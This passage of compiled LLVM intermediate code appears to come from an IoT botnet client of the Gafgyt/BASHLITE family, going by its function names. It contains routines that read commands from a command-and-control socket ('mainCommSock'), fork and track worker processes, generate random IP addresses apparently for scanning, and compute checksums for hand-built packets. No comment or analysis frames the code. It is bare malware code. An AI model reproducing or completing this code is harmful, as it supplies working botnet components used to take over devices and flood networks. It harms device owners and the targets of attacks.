  br i1 %18, label %78, label %19

; <label>:19:                                     ; preds = %16
  %20 = sext i32 %17 to i64
  %21 = shl nsw i64 %20, 2
  %22 = and i64 %21, 4294967292
  %23 = call noalias i8* @malloc(i64 %22) #3
  store i8* %23, i8** bitcast (i32** @fdopen_pids to i8**), align 8
  %24 = icmp eq i8* %23, null
  br i1 %24, label %78, label %25

; <label>:25:                                     ; preds = %19
  call void @llvm.memset.p0i8.i64(i8* nonnull %23, i8 0, i64 %21, i32 1, i1 false)
  br label %26

; <label>:26:                                     ; preds = %25, %13
  %27 = call i32 @vfork() #15
  switch i32 %27, label %61 [
    i32 -1, label %28
    i32 0, label %34
  ]

; <label>:28:                                     ; preds = %26
  %29 = load i32, i32* %10, align 4
  %30 = call i32 @close(i32 %29) #3
  %31 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %32 = load i32, i32* %31, align 4
  %33 = call i32 @close(i32 %32) #3
  br label %78

; <label>:34:                                     ; preds = %26
  %35 = load i8, i8* %1, align 1
  %36 = icmp eq i8 %35, 114
  br i1 %36, label %37, label %48

; <label>:37:                                     ; preds = %34
  %38 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %39 = load i32, i32* %38, align 4
  %40 = icmp eq i32 %39, 1
  br i1 %40, label %45, label %41

; <label>:41:                                     ; preds = %37
  %42 = call i32 @dup2(i32 %39, i32 1) #3
  %43 = load i32, i32* %38, align 4
  %44 = call i32 @close(i32 %43) #3
  br label %45

; <label>:45:                                     ; preds = %37, %41
  %46 = load i32, i32* %10, align 4
  %47 = call i32 @close(i32 %46) #3
  br label %59

; <label>:48:                                     ; preds = %34
  %49 = load i32, i32* %10, align 4
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %55, label %51

; <label>:51:                                     ; preds = %48
  %52 = call i32 @dup2(i32 %49, i32 0) #3
  %53 = load i32, i32* %10, align 4
  %54 = call i32 @close(i32 %53) #3
  br label %55

; <label>:55:                                     ; preds = %48, %51
  %56 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %57 = load i32, i32* %56, align 4
  %58 = call i32 @close(i32 %57) #3
  br label %59

; <label>:59:                                     ; preds = %55, %45
  %60 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* %0, i8* null) #3
  call void @_exit(i32 127) #16
  unreachable

; <label>:61:                                     ; preds = %26
  %62 = load i8, i8* %1, align 1
  %63 = icmp eq i8 %62, 114
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %61
  %65 = load i32, i32* %10, align 4
  %66 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %67 = load i32, i32* %66, align 4
  %68 = call i32 @close(i32 %67) #3
  br label %74

; <label>:69:                                     ; preds = %61
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %3, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = load i32, i32* %10, align 4
  %73 = call i32 @close(i32 %72) #3
  br label %74

; <label>:74:                                     ; preds = %69, %64
  %.011 = phi i32 [ %65, %64 ], [ %71, %69 ]
  %75 = load i32*, i32** @fdopen_pids, align 8
  %76 = sext i32 %.011 to i64
  %77 = getelementptr inbounds i32, i32* %75, i64 %76
  store i32 %27, i32* %77, align 4
  br label %78

; <label>:78:                                     ; preds = %19, %16, %9, %5, %2, %74, %28
  %.0 = phi i32 [ %.011, %74 ], [ -1, %28 ], [ -1, %2 ], [ -1, %5 ], [ -1, %9 ], [ -1, %16 ], [ -1, %19 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @getdtablesize() local_unnamed_addr #5

; Function Attrs: nounwind returns_twice
declare i32 @vfork() local_unnamed_addr #7

declare i32 @close(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) local_unnamed_addr #5

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #8

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) local_unnamed_addr #1 {
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca i32, align 4
  %5 = load i32*, i32** @fdopen_pids, align 8
  %6 = icmp eq i32* %5, null
  br i1 %6, label %37, label %7

; <label>:7:                                      ; preds = %1
  %8 = sext i32 %0 to i64
  %9 = getelementptr inbounds i32, i32* %5, i64 %8
  %10 = load i32, i32* %9, align 4
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %37, label %12

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @close(i32 %0) #3
  %14 = call i32 @sigemptyset(%struct.__sigset_t* nonnull %3) #3
  %15 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 2) #3
  %16 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 3) #3
  %17 = call i32 @sigaddset(%struct.__sigset_t* nonnull %3, i32 1) #3
  %18 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* nonnull %3, %struct.__sigset_t* nonnull %2) #3
  br label %19

; <label>:19:                                     ; preds = %25, %12
  %20 = load i32*, i32** @fdopen_pids, align 8
  %21 = getelementptr inbounds i32, i32* %20, i64 %8
  %22 = load i32, i32* %21, align 4
  %23 = call i32 @waitpid(i32 %22, i32* nonnull %4, i32 0) #3
  %24 = icmp eq i32 %23, -1
  br i1 %24, label %25, label %31

; <label>:25:                                     ; preds = %19
  %26 = tail call i32* @__errno_location() #17
  %27 = load i32, i32* %26, align 4
  %28 = icmp eq i32 %27, 4
  br i1 %28, label %19, label %.critedge

.critedge:                                        ; preds = %25
  %29 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %30 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %30, align 4
  br label %37

; <label>:31:                                     ; preds = %19
  %32 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* nonnull %2, %struct.__sigset_t* null) #3
  %33 = load i32*, i32** @fdopen_pids, align 8
  store i32 0, i32* %33, align 4
  %34 = load i32, i32* %4, align 4
  %35 = lshr i32 %34, 8
  %36 = and i32 %35, 255
  br label %37

; <label>:37:                                     ; preds = %.critedge, %31, %1, %7
  %.0 = phi i32 [ -1, %7 ], [ -1, %1 ], [ %36, %31 ], [ -1, %.critedge ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) local_unnamed_addr #5

declare i32 @waitpid(i32, i32*, i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = icmp sgt i32 %1, 0
  br i1 %4, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %3
  %5 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %6 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %7 = getelementptr inbounds i8, i8* %6, i64 -1
  %8 = load i8, i8* %7, align 1
  %9 = icmp eq i8 %8, 10
  br i1 %9, label %.critedge.loopexit, label %10

; <label>:10:                                     ; preds = %.lr.ph
  %11 = tail call i64 @read(i32 %2, i8* %6, i64 1) #3
  %12 = trunc i64 %11 to i32
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %13 = icmp eq i32 %12, 1
  %14 = icmp slt i64 %indvars.iv.next, %5
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %10
  %.011.lcssa.ph = phi i32 [ 1, %.lr.ph ], [ %12, %10 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %3
  %.011.lcssa = phi i32 [ 1, %3 ], [ %.011.lcssa.ph, %.critedge.loopexit ]
  %15 = icmp eq i32 %.011.lcssa, 0
  %16 = select i1 %15, i8* null, i8* %0
  ret i8* %16
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #3
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #17
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #17
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #3, !srcloc !1
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %6, %struct.__sigset_t* null, %struct.timeval* nonnull %7) #3
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #3
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #3
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #3
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #5

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i64 @parseHex(i8* nocapture readonly) local_unnamed_addr #10 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %11, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.05 = phi i64 [ %10, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.034 = phi i8* [ %6, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = shl i64 %.05, 4
  %6 = getelementptr inbounds i8, i8* %.034, i64 1
  %7 = zext i8 %4 to i64
  %8 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %7
  %9 = load i64, i64* %8, align 8
  %10 = or i64 %9, %5
  %11 = load i8, i8* %6, align 1
  %12 = icmp ne i8 %11, 0
  %13 = icmp sgt i64 %10, -1
  %14 = and i1 %13, %12
  br i1 %14, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.0.lcssa = phi i64 [ 0, %1 ], [ %10, %._crit_edge.loopexit ]
  ret i64 %.0.lcssa
}

; Function Attrs: noinline nounwind readonly uwtable
define i32 @wildString(i8* readonly, i8* readonly) local_unnamed_addr #11 {
  %3 = load i8, i8* %0, align 1
  switch i8 %3, label %32 [
    i8 0, label %4
    i8 42, label %7
    i8 63, label %21
  ]

; <label>:4:                                      ; preds = %2
  %5 = load i8, i8* %1, align 1
  %6 = zext i8 %5 to i32
  br label %47

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds i8, i8* %0, i64 1
  %9 = tail call i32 @wildString(i8* %8, i8* %1)
  %10 = icmp eq i32 %9, 0
  br i1 %10, label %18, label %11

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* %1, align 1
  %13 = icmp eq i8 %12, 0
  br i1 %13, label %18, label %14

; <label>:14:                                     ; preds = %11
  %15 = getelementptr inbounds i8, i8* %1, i64 1
  %16 = tail call i32 @wildString(i8* nonnull %0, i8* %15)
  %17 = icmp ne i32 %16, 0
  br label %18

; <label>:18:                                     ; preds = %11, %7, %14
  %19 = phi i1 [ false, %7 ], [ true, %11 ], [ %17, %14 ]
  %20 = zext i1 %19 to i32
  br label %47

; <label>:21:                                     ; preds = %2
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %29, label %24

; <label>:24:                                     ; preds = %21
  %25 = getelementptr inbounds i8, i8* %0, i64 1
  %26 = getelementptr inbounds i8, i8* %1, i64 1
  %27 = tail call i32 @wildString(i8* %25, i8* %26)
  %28 = icmp ne i32 %27, 0
  br label %29

; <label>:29:                                     ; preds = %21, %24
  %30 = phi i1 [ true, %21 ], [ %28, %24 ]
  %31 = zext i1 %30 to i32
  br label %47

; <label>:32:                                     ; preds = %2
  %33 = zext i8 %3 to i32
  %34 = tail call i32 @toupper(i32 %33) #14
  %35 = load i8, i8* %1, align 1
  %36 = zext i8 %35 to i32
  %37 = tail call i32 @toupper(i32 %36) #14
  %38 = icmp eq i32 %34, %37
  br i1 %38, label %39, label %44

; <label>:39:                                     ; preds = %32
  %40 = getelementptr inbounds i8, i8* %0, i64 1
  %41 = getelementptr inbounds i8, i8* %1, i64 1
  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8* nocapture) local_unnamed_addr #1 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %9, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.04 = phi i8* [ %8, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = zext i8 %4 to i32
  %6 = tail call i32 @toupper(i32 %5) #14
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* %.04, align 1
  %8 = getelementptr inbounds i8, i8* %.04, i64 1
  %9 = load i8, i8* %8, align 1
  %10 = icmp eq i8 %9, 0
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @RandString(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  %8 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 0
  store i64 30, i64* %8, align 8
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i64 0, i32 1
  store i64 0, i64* %9, align 8
  %10 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #3, !srcloc !2
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.__sigset_t* nonnull %4, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %4, %struct.timeval* nonnull %5) #3
  %22 = icmp sgt i32 %2, 1
  br i1 %22, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %31
  %.in = phi i32 [ %23, %31 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %32, %31 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %29, %31 ], [ %1, %.lr.ph.preheader ]
  %23 = add nsw i32 %.in, -1
  %24 = load i32, i32* @mainCommSock, align 4
  %25 = call i64 @recv(i32 %24, i8* nonnull %6, i64 1, i32 0) #3
  %26 = icmp eq i64 %25, 1
  br i1 %26, label %27, label %._crit_edge.loopexit

; <label>:27:                                     ; preds = %.lr.ph
  %28 = load i8, i8* %6, align 1
  %29 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %28, i8* %.01923, align 1
  %30 = icmp eq i8 %28, 10
  br i1 %30, label %._crit_edge.loopexit, label %31

; <label>:31:                                     ; preds = %27
  %32 = add nuw nsw i32 %.024, 1
  %33 = icmp sgt i32 %23, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %31, %27
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %29, %31 ], [ %29, %27 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %32, %31 ], [ %.024, %27 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #3
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %23, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #3
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %11 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %12 = load i32*, i32** @pids, align 8
  %13 = getelementptr inbounds i32, i32* %12, i64 %11
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %11
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = load i64, i64* @numpids, align 8
  %19 = add i64 %18, -1
  %20 = icmp ult i64 %17, %19
  br i1 %20, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.lcssa = phi i64 [ 0, %3 ], [ %19, %._crit_edge.loopexit ]
  %21 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %21, align 4
  %22 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  tail call void @free(i8* %22) #3
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %23

; <label>:23:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) local_unnamed_addr #1 {
  %2 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %3 = tail call i32 @ntohl(i32 %2) #17
  %4 = and i32 %3, %0
  %5 = tail call i32 @rand_cmwc()
  %6 = xor i32 %0, -1
  %7 = and i32 %5, %6
  %8 = xor i32 %7, %4
  ret i32 %8
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) local_unnamed_addr #9

; Function Attrs: noinline norecurse nounwind readonly uwtable
define zeroext i16 @csum(i16* nocapture readonly, i32) local_unnamed_addr #10 {
  %3 = icmp sgt i32 %1, 1
  br i1 %3, label %.lr.ph16.preheader, label %._crit_edge17

.lr.ph16.preheader:                               ; preds = %2
  %4 = add i32 %1, -2
  %5 = lshr i32 %4, 1
  %addconv = add nuw i32 %5, 1
  %6 = zext i32 %addconv to i64
  %7 = shl nuw i32 %5, 1
  %xtraiter = and i32 %addconv, 3
  %lcmp.mod = icmp eq i32 %xtraiter, 0
  br i1 %lcmp.mod, label %.lr.ph16.prol.loopexit, label %.lr.ph16.prol.preheader

.lr.ph16.prol.preheader:                          ; preds = %.lr.ph16.preheader
  br label %.lr.ph16.prol

.lr.ph16.prol:                                    ; preds = %.lr.ph16.prol, %.lr.ph16.prol.preheader
  %.014.prol = phi i64 [ %11, %.lr.ph16.prol ], [ 0, %.lr.ph16.prol.preheader ]
  %.0913.prol = phi i32 [ %12, %.lr.ph16.prol ], [ %1, %.lr.ph16.prol.preheader ]
  %.01012.prol = phi i16* [ %8, %.lr.ph16.prol ], [ %0, %.lr.ph16.prol.preheader ]
  %prol.iter = phi i32 [ %prol.iter.sub, %.lr.ph16.prol ], [ %xtraiter, %.lr.ph16.prol.preheader ]
  %8 = getelementptr inbounds i16, i16* %.01012.prol, i64 1
  %9 = load i16, i16* %.01012.prol, align 2
  %10 = zext i16 %9 to i64
  %11 = add i64 %10, %.014.prol
  %12 = add nsw i32 %.0913.prol, -2
  %prol.iter.sub = add i32 %prol.iter, -1
  %prol.iter.cmp = icmp eq i32 %prol.iter.sub, 0
  br i1 %prol.iter.cmp, label %.lr.ph16.prol.loopexit.unr-lcssa, label %.lr.ph16.prol, !llvm.loop !3

.lr.ph16.prol.loopexit.unr-lcssa:                 ; preds = %.lr.ph16.prol
  br label %.lr.ph16.prol.loopexit

.lr.ph16.prol.loopexit:                           ; preds = %.lr.ph16.preheader, %.lr.ph16.prol.loopexit.unr-lcssa
  %.014.unr = phi i64 [ 0, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.0913.unr = phi i32 [ %1, %.lr.ph16.preheader ], [ %12, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.01012.unr = phi i16* [ %0, %.lr.ph16.preheader ], [ %8, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %.lcssa26.unr = phi i64 [ undef, %.lr.ph16.preheader ], [ %11, %.lr.ph16.prol.loopexit.unr-lcssa ]
  %13 = icmp ult i32 %4, 6
  br i1 %13, label %._crit_edge17.loopexit, label %.lr.ph16.preheader.new

.lr.ph16.preheader.new:                           ; preds = %.lr.ph16.prol.loopexit
  br label %.lr.ph16

.lr.ph16:                                         ; preds = %.lr.ph16, %.lr.ph16.preheader.new
  %.014 = phi i64 [ %.014.unr, %.lr.ph16.preheader.new ], [ %29, %.lr.ph16 ]
  %.0913 = phi i32 [ %.0913.unr, %.lr.ph16.preheader.new ], [ %30, %.lr.ph16 ]
  %.01012 = phi i16* [ %.01012.unr, %.lr.ph16.preheader.new ], [ %26, %.lr.ph16 ]
  %14 = getelementptr inbounds i16, i16* %.01012, i64 1
  %15 = load i16, i16* %.01012, align 2
  %16 = zext i16 %15 to i64
  %17 = add i64 %16, %.014
  %18 = getelementptr inbounds i16, i16* %.01012, i64 2
  %19 = load i16, i16* %14, align 2
  %20 = zext i16 %19 to i64
  %21 = add i64 %20, %17
  %22 = getelementptr inbounds i16, i16* %.01012, i64 3
  %23 = load i16, i16* %18, align 2
  %24 = zext i16 %23 to i64
  %25 = add i64 %24, %21
  %26 = getelementptr inbounds i16, i16* %.01012, i64 4
  %27 = load i16, i16* %22, align 2
  %28 = zext i16 %27 to i64
  %29 = add i64 %28, %25
  %30 = add nsw i32 %.0913, -8
  %31 = icmp sgt i32 %30, 1
  br i1 %31, label %.lr.ph16, label %._crit_edge17.loopexit.unr-lcssa

._crit_edge17.loopexit.unr-lcssa:                 ; preds = %.lr.ph16
